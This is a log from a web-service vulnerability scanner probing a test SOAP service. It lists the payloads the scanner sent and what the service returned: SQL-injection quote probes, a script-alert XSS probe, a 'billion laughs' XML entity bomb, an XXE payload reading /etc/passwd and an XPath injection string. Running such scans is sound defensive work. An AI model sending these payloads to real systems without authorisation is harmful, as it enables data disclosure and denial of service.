18.04.2016 21:16:37 ==> Scan Started: 18.04.2016 21:16:37
18.04.2016 21:16:37 ==> WSDL Address: http://www.wstest.com/XSS.asmx?WSDL
18.04.2016 21:16:37 ==> Parsing WSDL...
18.04.2016 21:16:37 ==> Static Analysis Started
18.04.2016 21:16:37 ==>    Testing: Weak XML Schema: Unbounded Occurrences
18.04.2016 21:16:37 ==>    Testing: Weak XML Schema: Undefined Namespace
18.04.2016 21:16:37 ==>    Testing: Weak WS-SecurityPolicy: Insecure Transport
18.04.2016 21:16:37 ==>    Testing: Weak WS-SecurityPolicy: Insufficient Supporting Token Protection
18.04.2016 21:16:37 ==>    Testing: Weak WS-SecurityPolicy: Tokens Not Protected
18.04.2016 21:16:37 ==> Static Analysis Finished
18.04.2016 21:16:37 ==> Getting Methods...
18.04.2016 21:16:37 ==>  Vulnerability Found - SSL Not Used, Uri Schema is http
18.04.2016 21:16:37 ==> Method: ShowMessage
18.04.2016 21:16:37 ==>    Testing: Unauthenticated Service Method
18.04.2016 21:16:37 ==>    Parameter Count: 1
18.04.2016 21:16:37 ==>    txt - string:A
18.04.2016 21:16:37 ==>    Auth Vulnerability Found: A - status code is : 200
18.04.2016 21:16:37 ==>    Testing: Error Based SQL Injection
18.04.2016 21:16:37 ==>    Parameter Count: 1
18.04.2016 21:16:37 ==>    StatusCode: 200
18.04.2016 21:16:37 ==>    Result: '
18.04.2016 21:16:37 ==>    StatusCode: 200
18.04.2016 21:16:37 ==>    Result: '
18.04.2016 21:16:37 ==>    StatusCode: 200
18.04.2016 21:16:37 ==>    Result: '
18.04.2016 21:16:37 ==>    StatusCode: 200
18.04.2016 21:16:37 ==>    Result: '
18.04.2016 21:16:37 ==>    StatusCode: 200
18.04.2016 21:16:37 ==>    Result: '
18.04.2016 21:16:37 ==>    StatusCode: 200
18.04.2016 21:16:37 ==>    Result: '
18.04.2016 21:16:37 ==>    StatusCode: 200
18.04.2016 21:16:37 ==>    Result: '
18.04.2016 21:16:37 ==>    StatusCode: 200
18.04.2016 21:16:37 ==>    Result: '
18.04.2016 21:16:37 ==>    StatusCode: 200
18.04.2016 21:16:37 ==>    Result: '
18.04.2016 21:16:37 ==>    StatusCode: 200
18.04.2016 21:16:37 ==>    Result: '
18.04.2016 21:16:37 ==>    StatusCode: 200
18.04.2016 21:16:37 ==>    Result: '
18.04.2016 21:16:37 ==>    StatusCode: 200
18.04.2016 21:16:37 ==>    Result: '
18.04.2016 21:16:37 ==>    StatusCode: 200
18.04.2016 21:16:37 ==>    Result: '
18.04.2016 21:16:37 ==>    StatusCode: 200
18.04.2016 21:16:37 ==>    Result: '
18.04.2016 21:16:37 ==>    StatusCode: 200
18.04.2016 21:16:37 ==>    Result: '
18.04.2016 21:16:37 ==>    StatusCode: 200
18.04.2016 21:16:37 ==>    Result: '
18.04.2016 21:16:37 ==>    StatusCode: 200
18.04.2016 21:16:37 ==>    Result: '
18.04.2016 21:16:37 ==>    StatusCode: 200
18.04.2016 21:16:37 ==>    Result: '
18.04.2016 21:16:37 ==>    StatusCode: 200
18.04.2016 21:16:37 ==>    Result: '
18.04.2016 21:16:37 ==>    StatusCode: 200
18.04.2016 21:16:37 ==>    Result: '
18.04.2016 21:16:37 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    Testing: Cross Site Scripting
18.04.2016 21:16:38 ==>    Parameter Count: 1
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: <script>alert(1)</script>
18.04.2016 21:16:38 ==>    Cross Site Scripting Vulnerability Found: <script>alert(1)</script> - Response Text Contains: 
        <script>alert(1)</script>
        
18.04.2016 21:16:38 ==>    Testing: XML Bomb
18.04.2016 21:16:38 ==>    Parameter Count: 1
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: <?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
          <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
          <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
          <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
          <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <lolz>&lol9;</lolz>
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: <?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
          <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
          <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
          <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
          <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <lolz>&lol9;</lolz>
18.04.2016 21:16:38 ==>    Testing: External Entity Attack - XXE
18.04.2016 21:16:38 ==>    Parameter Count: 1
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:38 ==>    Testing: XPATH Injection
18.04.2016 21:16:38 ==>    Parameter Count: 1
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: 1' or 1=1
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: 1' or 1=1
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: 1' or 1=1
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: 1' or 1=1
18.04.2016 21:16:38 ==>    Testing: Could not establish trust relationship for the SSL/TLS secure channel.
18.04.2016 21:16:38 ==>    Parameter Count: 1
18.04.2016 21:16:38 ==> Method: XSSTest2
18.04.2016 21:16:38 ==>    Testing: Unauthenticated Service Method
18.04.2016 21:16:38 ==>    Parameter Count: 2
18.04.2016 21:16:38 ==>    txt - string:A
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    Auth Vulnerability Found: A - status code is : 200
18.04.2016 21:16:38 ==>    Testing: Error Based SQL Injection
18.04.2016 21:16:38 ==>    Parameter Count: 2
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    a - boolean:true
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    txt - string:A
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    txt - string:A
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    txt - string:A
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    txt - string:A
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    txt - string:A
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    txt - string:A
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    txt - string:A
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    txt - string:A
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    txt - string:A
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    txt - string:A
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    txt - string:A
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    txt - string:A
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    txt - string:A
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:38 ==>    txt - string:A
18.04.2016 21:16:38 ==>    StatusCode: 200
18.04.2016 21:16:38 ==>    Result: '
18.04.2016 21:16:39 ==>    txt - string:A
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: '
18.04.2016 21:16:39 ==>    txt - string:A
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: '
18.04.2016 21:16:39 ==>    txt - string:A
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: '
18.04.2016 21:16:39 ==>    txt - string:A
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: '
18.04.2016 21:16:39 ==>    txt - string:A
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: '
18.04.2016 21:16:39 ==>    txt - string:A
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: '
18.04.2016 21:16:39 ==>    txt - string:A
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: '
18.04.2016 21:16:39 ==>    txt - string:A
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: '
18.04.2016 21:16:39 ==>    txt - string:A
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: '
18.04.2016 21:16:39 ==>    Testing: Cross Site Scripting
18.04.2016 21:16:39 ==>    Parameter Count: 2
18.04.2016 21:16:39 ==>    a - boolean:true
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: <script>alert(1)</script>
18.04.2016 21:16:39 ==>    Cross Site Scripting Vulnerability Found: <script>alert(1)</script> - Response Text Contains: 
        <script>alert(1)</script>
        
18.04.2016 21:16:39 ==>    txt - string:A
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: <script>alert(1)</script>
18.04.2016 21:16:39 ==>    Cross Site Scripting Vulnerability Found: <script>alert(1)</script> - Response Text Contains: 
        <script>alert(1)</script>
        
18.04.2016 21:16:39 ==>    Testing: XML Bomb
18.04.2016 21:16:39 ==>    Parameter Count: 2
18.04.2016 21:16:39 ==>    a - boolean:true
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: <?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
          <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
          <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
          <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
          <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <lolz>&lol9;</lolz>
18.04.2016 21:16:39 ==>    a - boolean:true
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: <?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
          <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
          <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
          <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
          <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <lolz>&lol9;</lolz>
18.04.2016 21:16:39 ==>    txt - string:A
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: <?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
          <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
          <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
          <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
          <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <lolz>&lol9;</lolz>
18.04.2016 21:16:39 ==>    txt - string:A
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: <?xml version="1.0"?>
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
          <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
          <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
          <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
          <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
          <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
        <lolz>&lol9;</lolz>
18.04.2016 21:16:39 ==>    Testing: External Entity Attack - XXE
18.04.2016 21:16:39 ==>    Parameter Count: 2
18.04.2016 21:16:39 ==>    a - boolean:true
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:39 ==>    a - boolean:true
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:39 ==>    a - boolean:true
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:39 ==>    a - boolean:true
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:39 ==>    a - boolean:true
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:39 ==>    txt - string:A
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:39 ==>    txt - string:A
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:39 ==>    txt - string:A
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:39 ==>    txt - string:A
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:39 ==>    txt - string:A
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: <?xml version="1.0"?>
            <!DOCTYPE foo [  
              <!ELEMENT foo ANY >
              <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
18.04.2016 21:16:39 ==>    Testing: XPATH Injection
18.04.2016 21:16:39 ==>    Parameter Count: 2
18.04.2016 21:16:39 ==>    a - boolean:true
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: 1' or 1=1
18.04.2016 21:16:39 ==>    a - boolean:true
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: 1' or 1=1
18.04.2016 21:16:39 ==>    a - boolean:true
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: 1' or 1=1
18.04.2016 21:16:39 ==>    a - boolean:true
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: 1' or 1=1
18.04.2016 21:16:39 ==>    txt - string:A
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: 1' or 1=1
18.04.2016 21:16:39 ==>    txt - string:A
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: 1' or 1=1
18.04.2016 21:16:39 ==>    txt - string:A
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: 1' or 1=1
18.04.2016 21:16:39 ==>    txt - string:A
18.04.2016 21:16:39 ==>    StatusCode: 200
18.04.2016 21:16:39 ==>    Result: 1' or 1=1
18.04.2016 21:16:39 ==>    Testing: Could not establish trust relationship for the SSL/TLS secure channel.
18.04.2016 21:16:39 ==>    Parameter Count: 2
18.04.2016 21:16:39 ==> Information Disclosure Analysis Started
18.04.2016 21:16:39 ==>    Searching Response Header: HTTP Response Header: Server
18.04.2016 21:16:39 ==>    HTTP Response Header: Server Information Disclosure Found: microsoft-iis/10.0
18.04.2016 21:16:39 ==>    Searching Response Header: HTTP Response Header: X-Powered-By
18.04.2016 21:16:39 ==>    HTTP Response Header: X-Powered-By Information Disclosure Found: asp.net
18.04.2016 21:16:39 ==>    Searching Response Header: HTTP Response Header: X-AspNet-Version
18.04.2016 21:16:39 ==>    HTTP Response Header: X-AspNet-Version Information Disclosure Found: 4.0.30319
18.04.2016 21:16:39 ==>    Searching Response Header: HTTP Response Header: X-AspNetMvc-Version
18.04.2016 21:16:39 ==>    Searching Response Header: HTTP Response Header: X-Runtime
18.04.2016 21:16:39 ==>    Searching Response Header: HTTP Response Header: X-Version
18.04.2016 21:16:39 ==>    Searching Response Header: HTTP Response Header: Allow
18.04.2016 21:16:39 ==> Information Disclosure Analysis Finished
18.04.2016 21:16:39 ==> Scan Finished: 18.04.2016 21:16:39
